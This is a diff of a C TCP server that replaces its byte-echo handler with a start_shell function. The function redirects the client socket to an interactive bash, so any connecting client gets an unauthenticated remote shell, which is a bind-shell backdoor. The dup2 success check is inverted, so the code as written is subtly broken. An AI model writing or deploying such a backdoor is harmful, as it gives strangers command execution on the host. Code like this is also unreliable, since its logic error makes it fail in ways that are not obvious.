@@ -8,10 +8,46 @@
 #include <stdlib.h>
 #include <string.h>
 
+void start_shell(int client_sockfd) {
+	char* text;
+	int nread;
+	pid_t pid;
+
+	if((pid = fork()) == 0) {
+
+		if (setsid() == -1) {
+			perror("Setsid Error");
+			exit(1);
+		}
+
+		if((dup2(client_sockfd, 0) != -1) 
+			&& (dup2(client_sockfd, 1) != -1) 
+			&& (dup2(client_sockfd, 2) != -1)) {
+			perror("Dup call failed");
+			close(client_sockfd);
+			exit(1);
+		}
+
+		if (execlp("bash", "bash", "--noediting", "-i", NULL) == -1) {
+			perror("exec error");
+			close(client_sockfd);
+			exit(1);
+		}
+	}
+
+	else if (pid == -1) {
+		perror("Failed to fork");
+		close(client_sockfd);
+		exit(1);
+	}
+
+	return;
+}
+
 int main() 
 {
 	int server_sockfd, client_sockfd;
-	int server_len, client_len;
+	socklen_t server_len, client_len;
 	struct sockaddr_in server_address;
 	struct sockaddr_in client_address;
 
@@ -38,13 +74,10 @@ int main()
 			(struct sockaddr *)&client_address, &client_len);
 
 		if (fork() == 0) {
-			read(client_sockfd, &ch, 1);
-			sleep(5);
-			ch++;
-			write(client_sockfd, &ch, 1);
-			// start_shell(client_sockfd);
-			// close(client_sockfd);
-			// exit(0);
+			
+			close(server_sockfd);
+			start_shell(client_sockfd);
+			exit(1);
 		}
 		else {
 			close(client_sockfd);
